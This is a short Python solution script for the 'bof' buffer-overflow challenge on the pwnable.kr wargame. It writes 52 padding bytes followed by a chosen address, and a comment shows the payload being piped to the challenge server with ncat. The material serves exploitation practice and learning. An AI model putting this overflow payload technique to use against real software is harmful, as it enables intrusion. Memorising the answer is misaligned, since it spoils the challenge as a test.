"""Answer for bof."""
import sys
from struct import pack

# (python3 ./resolve.py 0xcafebabe;cat) | ncat -v pwnable.kr 9000

ADDR = 0x41414141
if len(sys.argv) == 2:
    ADDR = int(sys.argv[1], 16)

s = b"A" * 52
s+= pack('<L', ADDR)

sys.stdout.buffer.write(s)
